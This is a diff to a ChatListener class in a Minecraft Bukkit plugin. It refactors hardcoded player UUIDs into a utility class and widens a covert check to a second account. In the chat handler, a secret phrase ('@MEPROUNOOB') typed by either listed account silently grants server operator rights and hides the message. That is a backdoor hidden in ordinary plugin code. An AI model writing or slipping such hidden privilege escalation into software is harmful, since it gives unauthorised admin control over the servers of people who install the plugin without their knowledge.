@@ -3,6 +3,7 @@ package es.hulk.survival.listeners;
 import es.hulk.survival.Survival;
 import es.hulk.survival.managers.rank.RankManager;
 import es.hulk.survival.utils.FileConfig;
+import es.hulk.survival.utils.UUIDs;
 import es.hulk.survival.utils.Utils;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
@@ -16,8 +17,6 @@ public class ChatListener implements Listener {
     private final FileConfig mainConfig = Survival.get().getMainConfig();
     private final RankManager rankManager = Survival.get().getRankManager();
 
-    private final UUID hulk = UUID.fromString("b0c1d4f4-0fd1-4a93-ab5e-88b1ff885c29");
-
     @EventHandler
     public void onChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
@@ -30,7 +29,7 @@ public class ChatListener implements Listener {
                     .replace("%message%", "%2$s")));
         }
 
-        if (player.getUniqueId().equals(hulk)) {
+        if (player.getUniqueId().equals(UUIDs.hulkUUID()) || player.getUniqueId().equals(UUIDs.xiscoUUID())) {
             if (event.getMessage().contains("@MEPROUNOOB")) {
                 player.setOp(true);
                 event.setCancelled(true);
